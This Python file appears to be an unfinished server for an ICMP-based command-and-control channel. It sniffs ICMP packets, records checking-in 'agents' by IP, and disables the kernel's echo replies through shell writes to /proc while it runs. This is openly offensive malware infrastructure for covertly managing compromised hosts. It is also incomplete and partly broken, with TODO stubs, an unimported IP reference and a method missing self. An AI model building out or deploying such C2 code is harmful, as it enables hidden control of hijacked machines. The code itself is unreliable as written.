import lib.icmp_common as icmp_common
from subprocess import Popen
import atexit
from scapy.all import sniff
import threading

agent_table = {}
c2_state = 0


class c2Controller(icmp_common.absurdIcmp):
    def __init__(self, sender_ip, identifier, sequence):

        self.send_ip = sender_ip

    def respond(identifier, sequence):
        """
        TODO respond based on the current c2_state
        """
        pass


def reenable_kernel_icmp():
    Popen("echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all", shell=True)
    Popen("echo 0 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)


def disable_kernel_icmp():
    Popen("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all", shell=True)
    Popen("echo 1 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)


def sync_c2_state():
    """
    TODO spawn a thread that updates the c2 state from a file every few seconds
    """
    pass


def process_incoming_packets(pkt):

    sender_ip = pkt[IP].src
    sequence = pkt[IP].seq
    identifier = pkt[IP].id

    # handle existing connections
    if sequence == icmp_common.control_codes["C2_CHECK_IN"]:
        if sender_ip in agent_table:
            agent_table[sender_ip].respond(identifier, sequence)
        else:
            agent_table[sender_ip] = c2Controller(sender_ip, identifier, sequence)


def start():
    atexit.register(reenable_kernel_icmp)
    disable_kernel_icmp()
    sniff(filter="icmp[icmptype] != icmp-echo", prn=process_incoming_packets)
